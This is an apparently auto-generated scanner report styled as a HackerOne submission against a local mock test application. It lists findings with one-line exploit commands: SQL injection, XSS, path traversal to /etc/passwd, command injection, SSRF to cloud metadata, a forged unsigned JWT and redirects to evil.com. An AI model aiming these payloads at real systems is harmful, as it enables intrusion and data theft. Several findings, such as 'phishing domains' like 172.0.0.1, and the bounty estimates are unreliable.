# HackerOne Report: 127.0.0.1

## Summary
Total Findings: 65

- **Critical:** 7
- **High:** 19
- **Medium:** 20
- **Low:** 13
- **Info:** 6

## Findings

### SQL Injection [Critical]
**CVSS:** 9.8 | **CWE:** CWE-89

**Description:** SQLi: '

**URL:** `http://127.0.0.1:9999/search?q=`

**Evidence:**
```
<html><body>SQL syntax error near ''' at line 1</body></html>
```

**Exploit:**
```bash
sqlmap -u http://127.0.0.1:9999/search?q=' --dbs
```

**Bounty:** $500-$5,000

---

### XSS (Reflected) [High]
**CVSS:** 6.1 | **CWE:** CWE-79

**Description:** XSS: <script>alert(1)</script>

**URL:** `http://127.0.0.1:9999/echo?msg=`

**Evidence:**
```
<html><body><script>alert(1)</script></body></html>
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/echo?msg=<script>alert(1)</script>'
```

**Bounty:** $150-$1,000

---

### Path Traversal [High]
**CVSS:** 7.5 | **CWE:** CWE-22

**Description:** Path traversal: ../../etc/passwd

**URL:** `http://127.0.0.1:9999/file?name=`

**Evidence:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin
www-data:x:33:33:www-data:/var/www

```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/file?name=../../etc/passwd'
```

**Bounty:** $500-$3,000

---

### Command Injection [Critical]
**CVSS:** 9.8 | **CWE:** CWE-78

**Description:** CMDi: 127.0.0.1; id

**URL:** `http://127.0.0.1:9999/ping?host=`

**Evidence:**
```
<html><body>uid=33(www-data) gid=33(www-data) groups=33(www-data)</body></html>
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/ping?host=127.0.0.1; id'
```

**Bounty:** $2,000-$10,000

---

### Open Redirect [Medium]
**CVSS:** 6.1 | **CWE:** CWE-601

**Description:** Redirect to: https://evil.com

**URL:** `http://127.0.0.1:9999/redirect?url=`

**Evidence:**
```
Location: https://evil.com
```

**Exploit:**
```bash
curl -I 'http://127.0.0.1:9999/redirect?url=https://evil.com'
```

**Bounty:** $100-$500

---

### Open Redirect [Medium]
**CVSS:** 6.1 | **CWE:** CWE-601

**Description:** Redirect to: https://evil.com/%2f..

**URL:** `http://127.0.0.1:9999/redirect?url=`

**Evidence:**
```
Location: https://evil.com/%2f..
```

**Exploit:**
```bash
curl -I 'http://127.0.0.1:9999/redirect?url=https://evil.com/%2f..'
```

**Bounty:** $100-$500

---

### Open Redirect [Medium]
**CVSS:** 6.1 | **CWE:** CWE-601

**Description:** Redirect to: //evil.com

**URL:** `http://127.0.0.1:9999/redirect?url=`

**Evidence:**
```
Location: //evil.com
```

**Exploit:**
```bash
curl -I 'http://127.0.0.1:9999/redirect?url=//evil.com'
```

**Bounty:** $100-$500

---

### CORS Misconfiguration [High]
**CVSS:** 7.4 | **CWE:** CWE-942

**Description:** CORS: https://evil.com | ACAO: https://evil.com

**URL:** `http://127.0.0.1:9999/api/data`

**Evidence:**
```
ACAO: https://evil.com, ACAC: true
```

**Exploit:**
```bash
fetch('http://127.0.0.1:9999/api/data',{credentials:'include'}).then(r=>r.json())
```

**Bounty:** $200-$2,000

---

### CORS Misconfiguration [High]
**CVSS:** 7.4 | **CWE:** CWE-942

**Description:** CORS: null | ACAO: null

**URL:** `http://127.0.0.1:9999/api/data`

**Evidence:**
```
ACAO: null, ACAC: true
```

**Exploit:**
```bash
fetch('http://127.0.0.1:9999/api/data',{credentials:'include'}).then(r=>r.json())
```

**Bounty:** $200-$2,000

---

### IDOR [High]
**CVSS:** 7.5 | **CWE:** CWE-639

**Description:** IDOR: admin vs john

**URL:** `http://127.0.0.1:9999/user?id=`

**Evidence:**
```
User1: {"id": 1, "name": "admin", "email": "admin@target.com", "role": "admin"}
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/user?id=1'
```

**Bounty:** $500-$5,000

---

### SSRF [Critical]
**CVSS:** 9.1 | **CWE:** CWE-918

**Description:** SSRF: http://169.254.169.254/latest/meta-data/

**URL:** `http://127.0.0.1:9999/fetch?url=`

**Evidence:**
```
{"ami-id": "ami-12345", "instance-id": "i-12345", "instance-type": "t2.micro"}
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/fetch?url=http://169.254.169.254/latest/meta-data/'
```

**Bounty:** $500-$10,000

---

### GraphQL Introspection [Medium]
**CVSS:** 5.3 | **CWE:** CWE-200

**Description:** GraphQL schema exposed

**URL:** `http://127.0.0.1:9999/graphql`

**Evidence:**
```
{"data": {"__schema": {"types": [{"name": "Query", "fields": [{"name": "users"}, {"name": "secrets"}]}]}}}
```

**Exploit:**
```bash
curl -X POST 'http://127.0.0.1:9999/graphql' -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

**Bounty:** $150-$1,000

---

### Sensitive File [High]
**CVSS:** 5.3 | **CWE:** CWE-538

**Description:** Exposed: /.env [SENSITIVE!]

**URL:** `http://127.0.0.1:9999/.env`

**Evidence:**
```
DB_HOST=localhost
DB_USER=root
DB_PASS=SuperSecret123!
API_KEY=sk-1234567890abcdef
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/.env'
```

**Bounty:** $100-$1,000

---

### Sensitive File [High]
**CVSS:** 5.3 | **CWE:** CWE-538

**Description:** Exposed: /.git/config [SENSITIVE!]

**URL:** `http://127.0.0.1:9999/.git/config`

**Evidence:**
```
[core]
repositoryformatversion = 0
[remote origin]
url = https://github.com/target/secrets.git
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/.git/config'
```

**Bounty:** $100-$1,000

---

### Sensitive File [Low]
**CVSS:** 3.1 | **CWE:** CWE-538

**Description:** Exposed: /.git/HEAD

**URL:** `http://127.0.0.1:9999/.git/HEAD`

**Evidence:**
```
ref: refs/heads/main
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/.git/HEAD'
```

**Bounty:** $100-$1,000

---

### Sensitive File [High]
**CVSS:** 5.3 | **CWE:** CWE-538

**Description:** Exposed: /backup.sql [SENSITIVE!]

**URL:** `http://127.0.0.1:9999/backup.sql`

**Evidence:**
```
CREATE TABLE users (id INT, username VARCHAR(255), password VARCHAR(255))
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/backup.sql'
```

**Bounty:** $100-$1,000

---

### Sensitive File [High]
**CVSS:** 5.3 | **CWE:** CWE-538

**Description:** Exposed: /config.php [SENSITIVE!]

**URL:** `http://127.0.0.1:9999/config.php`

**Evidence:**
```
<?php $db_pass = 'P@ssw0rd123'; $secret_key = 'my-secret-key'; ?>
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/config.php'
```

**Bounty:** $100-$1,000

---

### Sensitive File [Low]
**CVSS:** 3.1 | **CWE:** CWE-538

**Description:** Exposed: /.htaccess

**URL:** `http://127.0.0.1:9999/.htaccess`

**Evidence:**
```
RewriteEngine On
AuthUserFile /var/www/.htpasswd
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/.htaccess'
```

**Bounty:** $100-$1,000

---

### Sensitive File [High]
**CVSS:** 5.3 | **CWE:** CWE-538

**Description:** Exposed: /web.config [SENSITIVE!]

**URL:** `http://127.0.0.1:9999/web.config`

**Evidence:**
```
<configuration><connectionStrings><add connectionString="Server=localhost;Password=Admin123!"/></connectionStrings></configuration>
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/web.config'
```

**Bounty:** $100-$1,000

---

### Sensitive File [Low]
**CVSS:** 3.1 | **CWE:** CWE-538

**Description:** Exposed: /robots.txt

**URL:** `http://127.0.0.1:9999/robots.txt`

**Evidence:**
```
User-agent: *
Disallow: /admin
Disallow: /api/internal
Disallow: /debug
Disallow: /backup
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/robots.txt'
```

**Bounty:** $100-$1,000

---

### Sensitive File [Low]
**CVSS:** 3.1 | **CWE:** CWE-538

**Description:** Exposed: /package.json

**URL:** `http://127.0.0.1:9999/package.json`

**Evidence:**
```
{"name":"target","dependencies":{"express":"4.17.1","lodash":"4.17.19","jquery":"3.5.0"}}
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/package.json'
```

**Bounty:** $100-$1,000

---

### Sensitive File [Low]
**CVSS:** 3.1 | **CWE:** CWE-538

**Description:** Exposed: /.aws/credentials

**URL:** `http://127.0.0.1:9999/.aws/credentials`

**Evidence:**
```
<html><head><title>Test App</title></head><body><h1>Welcome to Test Application v1.0</h1><p>Server: Apache/2.4.41 | PHP/7.4.3 | jQuery 3.5.0</p><a hre
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/.aws/credentials'
```

**Bounty:** $100-$1,000

---

### Sensitive File [Low]
**CVSS:** 3.1 | **CWE:** CWE-538

**Description:** Exposed: /Dockerfile

**URL:** `http://127.0.0.1:9999/Dockerfile`

**Evidence:**
```
<html><head><title>Test App</title></head><body><h1>Welcome to Test Application v1.0</h1><p>Server: Apache/2.4.41 | PHP/7.4.3 | jQuery 3.5.0</p><a hre
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/Dockerfile'
```

**Bounty:** $100-$1,000

---

### Sensitive File [Low]
**CVSS:** 3.1 | **CWE:** CWE-538

**Description:** Exposed: /phpinfo.php

**URL:** `http://127.0.0.1:9999/phpinfo.php`

**Evidence:**
```
PHP Version 7.4.3 - phpinfo()
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/phpinfo.php'
```

**Bounty:** $100-$1,000

---

### Sensitive File [Low]
**CVSS:** 3.1 | **CWE:** CWE-538

**Description:** Exposed: /debug

**URL:** `http://127.0.0.1:9999/debug`

**Evidence:**
```
<html><head><title>Test App</title></head><body><h1>Welcome to Test Application v1.0</h1><p>Server: Apache/2.4.41 | PHP/7.4.3 | jQuery 3.5.0</p><a hre
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/debug'
```

**Bounty:** $100-$1,000

---

### Sensitive File [Low]
**CVSS:** 3.1 | **CWE:** CWE-538

**Description:** Exposed: /elmah.axd

**URL:** `http://127.0.0.1:9999/elmah.axd`

**Evidence:**
```
<html><head><title>Test App</title></head><body><h1>Welcome to Test Application v1.0</h1><p>Server: Apache/2.4.41 | PHP/7.4.3 | jQuery 3.5.0</p><a hre
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/elmah.axd'
```

**Bounty:** $100-$1,000

---

### API Endpoint [Medium]
**CVSS:** 5.3 | **CWE:** CWE-200

**Description:** API found: /api/v1/users

**URL:** `http://127.0.0.1:9999/api/v1/users`

**Evidence:**
```
{"users": [{"id": 1, "name": "admin"}, {"id": 2, "name": "user"}]}
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/api/v1/users'
```

**Bounty:** $150-$1,000

---

### API Endpoint [Medium]
**CVSS:** 5.3 | **CWE:** CWE-200

**Description:** API found: /api/v1/config

**URL:** `http://127.0.0.1:9999/api/v1/config`

**Evidence:**
```
{"debug": true, "version": "1.0", "admin_panel": "/admin"}
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/api/v1/config'
```

**Bounty:** $150-$1,000

---

### API Endpoint [Medium]
**CVSS:** 5.3 | **CWE:** CWE-200

**Description:** API found: /api/v2/auth

**URL:** `http://127.0.0.1:9999/api/v2/auth`

**Evidence:**
```
{"token_endpoint": "/oauth/token", "grant_types": ["password", "authorization_code"]}
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/api/v2/auth'
```

**Bounty:** $150-$1,000

---

### API Endpoint [Medium]
**CVSS:** 5.3 | **CWE:** CWE-200

**Description:** API found: /api/docs

**URL:** `http://127.0.0.1:9999/api/docs`

**Evidence:**
```
{"swagger": "2.0", "info": {"title": "Target API", "version": "1.0"}}
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/api/docs'
```

**Bounty:** $150-$1,000

---

### API Endpoint [Medium]
**CVSS:** 5.3 | **CWE:** CWE-200

**Description:** API found: /swagger.json

**URL:** `http://127.0.0.1:9999/swagger.json`

**Evidence:**
```
{"swagger": "2.0", "info": {"title": "Target API"}}
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/swagger.json'
```

**Bounty:** $150-$1,000

---

### API Endpoint [Medium]
**CVSS:** 5.3 | **CWE:** CWE-200

**Description:** API found: /openapi.json

**URL:** `http://127.0.0.1:9999/openapi.json`

**Evidence:**
```
{"openapi": "3.0.0", "info": {"title": "Target API"}}
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/openapi.json'
```

**Bounty:** $150-$1,000

---

### No Rate Limiting [Medium]
**CVSS:** 5.3 | **CWE:** CWE-307

**Description:** No rate limit on /login

**URL:** `http://127.0.0.1:9999/login`

**Evidence:**
```
15 requests no blocking
```

**Exploit:**
```bash
Brute force /login
```

**Bounty:** $150-$1,000

---

### No Rate Limiting [Medium]
**CVSS:** 5.3 | **CWE:** CWE-307

**Description:** No rate limit on /rate-test

**URL:** `http://127.0.0.1:9999/rate-test`

**Evidence:**
```
15 requests no blocking
```

**Exploit:**
```bash
Brute force /rate-test
```

**Bounty:** $150-$1,000

---

### XXE Injection [Critical]
**CVSS:** 9.1 | **CWE:** CWE-611

**Description:** XXE: SYSTEM entity

**URL:** `http://127.0.0.1:9999/xml`

**Evidence:**
```
<?xml version="1.0"?><response>root:x:0:0:root:/root:/bin/bash</response>
```

**Exploit:**
```bash
curl -X POST 'http://127.0.0.1:9999/xml' -d 'XXE payload'
```

**Bounty:** $2,000-$15,000

---

### SSTI [Critical]
**CVSS:** 9.8 | **CWE:** CWE-1336

**Description:** SSTI: {{7*7}} -> 49

**URL:** `http://127.0.0.1:9999/template?name=`

**Evidence:**
```
<html><body>Hello {{7*7}} Rendered: 49</body></html>
```

**Exploit:**
```bash
curl 'http://127.0.0.1:9999/template?name={{7*7}}'
```

**Bounty:** $5,000-$30,000

---

### DNS Rebinding [High]
**CVSS:** 7.5 | **CWE:** CWE-346

**Description:** Internal access: 127.0.0.1

**URL:** `http://127.0.0.1:9999/fetch?url=http://127.0.0.1/`

**Evidence:**
```
{"ami-id": "ami-12345", "instance-id": "i-12345", "instance-type": "t2.micro"}
```

**Exploit:**
```bash
DNS rebinding to 127.0.0.1
```

**Bounty:** $1,000-$10,000

---

### OAuth Vulnerability [High]
**CVSS:** 7.4 | **CWE:** CWE-601

**Description:** OAuth open redirect: /oauth/authorize

**URL:** `http://127.0.0.1:9999/oauth/authorize`

**Evidence:**
```
Location: https://evil.com?code=test123&state=abc
```

**Exploit:**
```bash
Manipulate redirect_uri
```

**Bounty:** $3,000-$20,000

---

### Clickjacking [Low]
**CVSS:** 4.3 | **CWE:** CWE-1021

**Description:** No X-Frame-Options: /

**URL:** `http://127.0.0.1:9999/`

**Evidence:**
```
XFO: MISSING
```

**Exploit:**
```bash
<iframe src="http://127.0.0.1:9999/">
```

**Bounty:** $500-$5,000

---

### Clickjacking [Low]
**CVSS:** 4.3 | **CWE:** CWE-1021

**Description:** No X-Frame-Options: /login

**URL:** `http://127.0.0.1:9999/login`

**Evidence:**
```
XFO: MISSING
```

**Exploit:**
```bash
<iframe src="http://127.0.0.1:9999/login">
```

**Bounty:** $500-$5,000

---

### Clickjacking [Low]
**CVSS:** 4.3 | **CWE:** CWE-1021

**Description:** No X-Frame-Options: /frame-test

**URL:** `http://127.0.0.1:9999/frame-test`

**Evidence:**
```
XFO: MISSING
```

**Exploit:**
```bash
<iframe src="http://127.0.0.1:9999/frame-test">
```

**Bounty:** $500-$5,000

---

### Business Logic [High]
**CVSS:** 7.5 | **CWE:** CWE-840

**Description:** Price manipulation possible: 99.99

**URL:** `http://127.0.0.1:9999/shop/price`

**Evidence:**
```
Price: {'name': 'Premium', 'price': 99.99}
```

**Exploit:**
```bash
Modify quantity to negative
```

**Bounty:** $5,000-$50,000

---

### JWT Vulnerability [Critical]
**CVSS:** 9.8 | **CWE:** CWE-347

**Description:** JWT alg: none [NONE ALG!]

**URL:** `http://127.0.0.1:9999/api/jwt`

**Evidence:**
```
Header: {"alg": "none", "typ": "JWT"}
```

**Exploit:**
```bash
Forged JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.
```

**Bounty:** $2,000-$10,000

---

### API Fuzzing [Medium]
**CVSS:** 5.3 | **CWE:** CWE-20

**Description:** API accepts input: /api/fuzz

**URL:** `http://127.0.0.1:9999/api/fuzz`

**Evidence:**
```
{"status": "processed"}
```

**Exploit:**
```bash
Fuzz /api/fuzz
```

**Bounty:** $5,000-$50,000

---

### Subdomain Takeover [High]
**CVSS:** 7.5 | **CWE:** CWE-350

**Description:** Takeover (Heroku)

**URL:** `http://127.0.0.1:9999/cname`

**Evidence:**
```
There is no app configured at this hostname. Heroku
```

**Exploit:**
```bash
Register Heroku and claim subdomain
```

**Bounty:** $500-$10,000

---

### Brute Force [Critical]
**CVSS:** 9.8 | **CWE:** CWE-521

**Description:** Weak creds: admin:admin123

**URL:** `http://127.0.0.1:9999/auth`

**Evidence:**
```
{"status": "success"}
```

**Exploit:**
```bash
curl -X POST 'http://127.0.0.1:9999/auth' -d '{"username": "admin", "password": "admin123"}'
```

**Bounty:** $500-$5,000

---

### Session Management [Medium]
**CVSS:** 4.3 | **CWE:** CWE-614

**Description:** Cookie issues: Missing Secure

**URL:** `http://127.0.0.1:9999/login`

**Evidence:**
```
Cookie: session=abc123; Path=/; HttpOnly; SameSite=None
```

**Exploit:**
```bash
Session hijacking via cookie theft
```

**Bounty:** $2,000-$10,000

---

### Recon: DNS [Info]
**CVSS:** 0.0 | **CWE:** 

**Description:** DNS: 127.0.0.1

**Evidence:**
```
IPs: ['127.0.0.1']
```

**Exploit:**
```bash
Map attack surface
```

**Bounty:** Info

---

### Recon: Technologies [Info]
**CVSS:** 0.0 | **CWE:** 

**Description:** Tech: Server: BaseHTTP/0.6 Python/3.12.7, Jquery

**Evidence:**
```
Server: BaseHTTP/0.6 Python/3.12.7, Jquery
```

**Exploit:**
```bash
Research CVEs
```

**Bounty:** Info

---

### OSINT: robots.txt [Low]
**CVSS:** 3.1 | **CWE:** 

**Description:** 4 hidden paths

**URL:** `http://127.0.0.1:9999/robots.txt`

**Evidence:**
```
/admin, /api/internal, /debug, /backup
```

**Exploit:**
```bash
Enumerate paths
```

**Bounty:** $100-$500

---

### OSINT: Admin Panel [Medium]
**CVSS:** 4.3 | **CWE:** 

**Description:** Admin: /admin (401)

**URL:** `http://127.0.0.1:9999/admin`

**Evidence:**
```
Status: 401
```

**Exploit:**
```bash
Brute force /admin
```

**Bounty:** $200-$2,000

---

### OSINT: Admin Panel [Medium]
**CVSS:** 4.3 | **CWE:** 

**Description:** Admin: /administrator (200)

**URL:** `http://127.0.0.1:9999/administrator`

**Evidence:**
```
Status: 200
```

**Exploit:**
```bash
Brute force /administrator
```

**Bounty:** $200-$2,000

---

### OSINT: Admin Panel [Medium]
**CVSS:** 4.3 | **CWE:** 

**Description:** Admin: /wp-admin (200)

**URL:** `http://127.0.0.1:9999/wp-admin`

**Evidence:**
```
Status: 200
```

**Exploit:**
```bash
Brute force /wp-admin
```

**Bounty:** $200-$2,000

---

### OSINT: Admin Panel [Medium]
**CVSS:** 4.3 | **CWE:** 

**Description:** Admin: /cpanel (200)

**URL:** `http://127.0.0.1:9999/cpanel`

**Evidence:**
```
Status: 200
```

**Exploit:**
```bash
Brute force /cpanel
```

**Bounty:** $200-$2,000

---

### OSINT: Admin Panel [Medium]
**CVSS:** 4.3 | **CWE:** 

**Description:** Admin: /phpmyadmin (200)

**URL:** `http://127.0.0.1:9999/phpmyadmin`

**Evidence:**
```
Status: 200
```

**Exploit:**
```bash
Brute force /phpmyadmin
```

**Bounty:** $200-$2,000

---

### OSINT: Backup [High]
**CVSS:** 7.5 | **CWE:** 

**Description:** Backup: /backup.zip

**URL:** `http://127.0.0.1:9999/backup.zip`

**Evidence:**
```
Size: 236 bytes
```

**Exploit:**
```bash
curl -O 'http://127.0.0.1:9999/backup.zip'
```

**Bounty:** $500-$5,000

---

### OSINT: Backup [High]
**CVSS:** 7.5 | **CWE:** 

**Description:** Backup: /backup.tar.gz

**URL:** `http://127.0.0.1:9999/backup.tar.gz`

**Evidence:**
```
Size: 236 bytes
```

**Exploit:**
```bash
curl -O 'http://127.0.0.1:9999/backup.tar.gz'
```

**Bounty:** $500-$5,000

---

### OSINT: Backup [High]
**CVSS:** 7.5 | **CWE:** 

**Description:** Backup: /db_backup.sql

**URL:** `http://127.0.0.1:9999/db_backup.sql`

**Evidence:**
```
Size: 236 bytes
```

**Exploit:**
```bash
curl -O 'http://127.0.0.1:9999/db_backup.sql'
```

**Bounty:** $500-$5,000

---

### OSINT: Backup [High]
**CVSS:** 7.5 | **CWE:** 

**Description:** Backup: /www.zip

**URL:** `http://127.0.0.1:9999/www.zip`

**Evidence:**
```
Size: 236 bytes
```

**Exploit:**
```bash
curl -O 'http://127.0.0.1:9999/www.zip'
```

**Bounty:** $500-$5,000

---

### Recon: No SSL [Info]
**CVSS:** 0.0 | **CWE:** 

**Description:** No SSL/TLS

**Evidence:**
```
No HTTPS
```

**Exploit:**
```bash
Check port 443
```

**Bounty:** Info

---

### OSINT: Phishing Risk [Info]
**CVSS:** 0.0 | **CWE:** 

**Description:** 9 phishing domains

**Evidence:**
```
217.0.0.1, 172.0.0.1, www-127.0.0.1, secure-127.0.0.1, login-127.0.0.1, account-127.0.0.1, 127-secure.0.0.1, 127-login.0.0.1, 127-verify.0.0.1
```

**Exploit:**
```bash
Register defensively
```

**Bounty:** $1,000-$10,000

---

### Email Security [Medium]
**CVSS:** 4.3 | **CWE:** CWE-290

**Description:** Issues: SPF soft fail, DMARC p=none, No DKIM

**Evidence:**
```
SPF: v=spf1 include:_spf.google.com ~all, DMARC: v=DMARC1; p=none
```

**Exploit:**
```bash
Email spoofing: SPF soft fail, DMARC p=none, No DKIM
```

**Bounty:** $1,000-$5,000

---

### Recon: Topology [Info]
**CVSS:** 0.0 | **CWE:** 

**Description:** Topology: 0 ports

**Evidence:**
```
{"ips": ["127.0.0.1"], "ports": []}
```

**Exploit:**
```bash
Map network
```

**Bounty:** Info

---

### JS Library CVE [High]
**CVSS:** 6.1 | **CWE:** CWE-1104

**Description:** lodash 4.17.19: 1 CVEs

**URL:** `http://127.0.0.1:9999/package.json`

**Evidence:**
```
lodash: 4.17.19
```

**Exploit:**
```bash
Update lodash
```

**Bounty:** $500-$5,000

---

### Recon: Wordlist [Info]
**CVSS:** 0.0 | **CWE:** 

**Description:** Wordlist: 140 words

**Evidence:**
```
140 unique words
```

**Exploit:**
```bash
Use for directory brute forcing
```

**Bounty:** Info

---

